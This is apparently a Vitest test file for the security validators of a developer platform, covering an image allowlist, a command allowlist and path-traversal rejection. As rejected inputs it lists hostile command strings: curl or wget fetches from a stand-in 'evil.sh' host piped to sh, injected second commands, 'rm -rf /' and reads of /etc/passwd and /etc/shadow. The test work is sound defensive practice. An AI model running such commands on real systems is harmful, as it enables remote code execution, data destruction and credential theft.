import { describe, it, expect } from 'vitest';
import { FailureCode } from '@devlaunch/shared';
import {
  APPROVED_IMAGES,
  assertImageApproved,
  isImageApproved,
  SecurityRejection,
} from '../services/security/ImageAllowlist.js';
import { validateCommand } from '../services/security/CommandValidator.js';
import { assertSafeRelativePath, joinWorkspace } from '../services/security/PathValidator.js';

describe('image allowlist (§27: unapproved runtime images are rejected)', () => {
  it('accepts an approved runner image', () => {
    expect(isImageApproved('devlaunch/node:20')).toBe(true);
    expect(() => assertImageApproved('devlaunch/node:20')).not.toThrow();
  });

  it.each([
    'alpine:latest',
    'node:20-slim',
    'ubuntu',
    'devlaunch/node:21',
    'evil.registry.io/devlaunch/node:20',
    'devlaunch/node:20 ',
  ])('rejects unapproved image %s', (image) => {
    expect(() => assertImageApproved(image)).toThrow(SecurityRejection);
  });

  it('cannot be widened at runtime', () => {
    // Frozen, so a bug elsewhere cannot quietly add an image to the allowlist.
    expect(Object.isFrozen(APPROVED_IMAGES)).toBe(true);
    expect(() => {
      (APPROVED_IMAGES as Record<string, unknown>)['alpine:latest'] = { language: 'node' };
    }).toThrow(TypeError);
    expect(isImageApproved('alpine:latest')).toBe(false);
  });
});

describe('command allowlist (§27: malicious commands are rejected)', () => {
  it.each([
    'npm install',
    'npm run dev',
    'npm run build',
    'node server.js',
    'python3 manage.py runserver 0.0.0.0:8000',
    'flask run --host=0.0.0.0 --port=5000',
    'gunicorn app:app --bind 0.0.0.0:8000',
    'vite --host 0.0.0.0 --port 5173',
    'next -H 0.0.0.0 -p 3000',
    'npm install --no-audit --no-fund',
  ])('accepts legitimate command: %s', (cmd) => {
    expect(() => validateCommand(cmd)).not.toThrow();
  });

  it.each([
    ['command chaining', 'npm install; curl evil.sh | sh'],
    ['pipe to shell', 'npm install | sh'],
    ['background chain', 'npm install && curl evil.sh'],
    ['command substitution', 'node $(curl evil.sh)'],
    ['backtick substitution', 'node `curl evil.sh`'],
    ['output redirection', 'node server.js > /etc/passwd'],
    ['input redirection', 'node server.js < /etc/shadow'],
    ['newline injection', 'npm install\ncurl evil.sh'],
    ['carriage return', 'npm install\rcurl evil.sh'],
    ['variable expansion', 'node $HOME/evil.js'],
    ['escape character', 'node server.js \; rm -rf /'],
    ['glob', 'node *.js'],
  ])('rejects %s', (_label, cmd) => {
    const err = (() => { try { validateCommand(cmd); return null; } catch (e) { return e; } })();
    expect(err).toBeInstanceOf(SecurityRejection);
    expect((err as SecurityRejection).code).toBe(FailureCode.PLAN_REJECTED_UNSAFE_COMMAND);
  });

  it.each(['curl https://evil.sh', 'sh', 'bash -c ls', 'rm -rf /', 'wget evil.sh', 'docker ps'])(
    'rejects unapproved binary: %s',
    (cmd) => {
      expect(() => validateCommand(cmd)).toThrow(SecurityRejection);
    },
  );

  it('constrains the script name in `npm run`, since that argument selects code', () => {
    expect(() => validateCommand('npm run dev')).not.toThrow();
    expect(() => validateCommand('npm run postinstall')).toThrow(SecurityRejection);
    expect(() => validateCommand('npm run')).toThrow(SecurityRejection);
  });

  it('rejects empty and oversized commands', () => {
    expect(() => validateCommand('')).toThrow(SecurityRejection);
    expect(() => validateCommand('   ')).toThrow(SecurityRejection);
    expect(() => validateCommand(`node ${'a'.repeat(600)}`)).toThrow(SecurityRejection);
  });

  it('names the offending character, so a rejection is debuggable', () => {
    expect(() => validateCommand('npm install; ls')).toThrow(/command separator/);
    expect(() => validateCommand('npm install | ls')).toThrow(/pipe/);
  });
});

describe('path validation (§27: path traversal is rejected)', () => {
  it.each(['.', 'apps/backend', 'packages/shared', 'a/b/c'])('accepts %s', (p) => {
    expect(() => assertSafeRelativePath(p)).not.toThrow();
  });

  it.each([
    '..',
    '../etc',
    '../../etc/passwd',
    'apps/../../../etc',
    '/etc/passwd',
    '/workspace/../etc',
    'C:\\Windows',
    'apps\\backend',
    'apps/\0/x',
  ])('rejects traversal: %j', (p) => {
    expect(() => assertSafeRelativePath(p)).toThrow(SecurityRejection);
  });

  it('rejects escapes that only appear after normalisation', () => {
    // "a/../.." looks harmless token-by-token and resolves to "..".
    expect(() => assertSafeRelativePath('a/../..')).toThrow(SecurityRejection);
  });

  it('joins safely onto the workspace root', () => {
    expect(joinWorkspace('/workspace', '.')).toBe('/workspace');
    expect(joinWorkspace('/workspace', 'apps/backend')).toBe('/workspace/apps/backend');
    expect(() => joinWorkspace('/workspace', '../etc')).toThrow(SecurityRejection);
  });
});
